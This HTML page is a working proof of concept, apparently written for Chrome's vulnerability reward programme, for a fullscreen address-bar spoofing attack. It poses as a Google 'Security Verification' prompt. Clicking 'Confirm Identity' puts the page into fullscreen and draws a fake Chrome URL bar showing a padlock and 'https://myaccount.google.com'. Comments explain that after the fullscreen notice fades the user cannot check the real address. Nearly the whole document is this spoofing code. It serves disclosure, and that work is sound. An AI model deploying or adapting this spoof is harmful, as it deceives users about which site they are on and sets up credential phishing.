<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Chrome VRP: Fullscreen Redress</title>
    <style>
        body { margin: 0; padding: 0; font-family: -apple-system, sans-serif; background: #fff; overflow: hidden; }
        
        /* The Fake Address Bar - Hidden until Fullscreen is active */
        #fake-chrome-ui {
            display: none; position: fixed; top: 0; left: 0; width: 100%;
            height: 56px; background: #fff; border-bottom: 1px solid #dadce0;
            z-index: 9999; align-items: center; padding: 0 15px; box-sizing: border-box;
        }
        #fake-url-bar {
            background: #f1f3f4; border-radius: 20px; height: 34px; width: 100%;
            display: flex; align-items: center; padding: 0 15px; font-size: 14px; color: #3c4043;
        }
        .lock-icon { width: 12px; margin-right: 8px; }

        /* Initial Page Content */
        .content { padding: 100px 20px; text-align: center; }
        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 16px; width: 100%; }
    </style>
</head>
<body>

    <div id="fake-chrome-ui">
        <div id="fake-url-bar">
            <img src="https://upload.wikimedia.org/wikipedia/commons/9/97/Lock_font_awesome.svg" class="lock-icon">
            https://myaccount.google.com
        </div>
    </div>

    <div class="content" id="main-ui">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
        <h3>Security Verification</h3>
        <p>Confirm your identity to stay signed in.</p>
        <button class="btn" onclick="goFull()">Confirm Identity</button>
    </div>

    <script>
        function goFull() {
            let elem = document.documentElement;
            
            // 1. Enter Fullscreen Mode
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen();
            }

            // 2. Hide the original UI and show the 'Fake Chrome' UI
            document.getElementById('main-ui').style.paddingTop = "80px"; // Make room for fake bar
            document.getElementById('fake-chrome-ui').style.display = "flex";

            // 3. Logic: We wait 2 seconds for the 'You are in fullscreen' toast to vanish
            // Once it's gone, the user has NO WAY to verify the real URL.
            setTimeout(() => {
                console.log("System toast should be gone. Spoof active.");
            }, 2500);
        }

        // Detect if user exits fullscreen and hide the fake UI
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement) {
                document.getElementById('fake-chrome-ui').style.display = "none";
                document.getElementById('main-ui').style.paddingTop = "100px";
            }
        });
    </script>
</body>
</html>
